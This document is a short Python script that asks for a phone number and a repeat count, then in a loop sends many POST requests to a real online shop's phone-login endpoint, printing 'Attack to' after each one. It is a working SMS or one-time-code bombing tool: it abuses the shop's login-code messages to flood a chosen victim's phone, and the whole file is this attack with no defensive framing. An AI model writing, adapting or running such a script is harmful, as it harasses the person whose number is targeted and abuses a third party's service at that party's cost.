import requests
import json
import datetime
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
t= datetime.datetime.now()
while 1:
        print("Number Example 01234567890")
        name = input("Enter 1st Number ")

        i=int(input("Enter Counter "))
        y=0
        while y<i:
            url = 'https://api.aleshamart.com/api/v3/phonelogin'
            myobj1 = {"phone":name}

    #use the 'headers' parameter to set the HTTP headers:
            try:
                requests.post(url, data = json.dumps(myobj1),headers = {'Content-Type':'application/json; charset=utf-8','Content-Length':'23','host':'api.aleshamart.com'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj1),headers = {'Content-Type':'application/json; charset=utf-8','Content-Length':'23','host':'api.aleshamart.com'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj1),headers = {'Content-Type':'application/json; charset=utf-8','Content-Length':'23','host':'api.aleshamart.com'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
               requests.post(url, data = json.dumps(myobj1), headers = {'Content-Type':'application/json; charset=utf-8','Content-Length':'23','host':'api.aleshamart.com'})
               print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj1), headers = {'Content-Type':'application/json; charset=utf-8','Content-Length':'23','host':'api.aleshamart.com'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            print(y)
            y= y+1
        print("\nCounting Completed")
